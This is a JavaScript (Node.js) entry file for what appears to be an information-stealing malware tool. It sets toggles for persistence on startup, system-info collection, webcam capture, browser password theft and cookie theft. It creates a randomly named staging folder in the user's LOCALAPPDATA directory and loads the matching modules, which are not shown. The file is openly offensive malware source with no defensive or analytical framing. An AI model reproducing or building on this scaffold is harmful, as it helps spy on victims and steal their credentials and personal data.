// suck my nuts, heres all the toggles
let runOnStartupToggle = false; //TODO
let sysInfoToggle = true;
let webcamToggle = true;
let browserPassToggle = true;
let browserCookieToggle = false; //TODO

// mutex generation for directory creation
const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');

const randomKey = crypto.randomBytes(10).toString('hex');
const localAppData = process.env.LOCALAPPDATA;
const DirectoryPath = path.join(localAppData, randomKey);
module.exports = { DirectoryPath };

console.log(`${DirectoryPath} has been created.`)

fs.mkdir(DirectoryPath, { recursive: true })
    .then(() => {

        if (runOnStartupToggle){
          require('./modules/startup.js')
        }
        if (sysInfoToggle){
          require('./modules/systeminfo.js')
        }
        if (webcamToggle){
          require('./modules/webcam.js')
        }
        if (browserPassToggle){
          require('./modules/browserpass.js')
        }
        if (browserCookieToggle){
          require('./modules/browsercookie.js')
        }
    })
    .catch((err) => {
      console.log(err);
    });

//fs.mkdir(path.join(DirectoryPath, "Images"), {recursive: true}, (err) => {
//    if (err) {
//        console.error('Error creating directory: ', err);
//    } else {
//        console.log('Directory created successfully: ', path.join(DirectoryPath, "Images"));
//    }
//})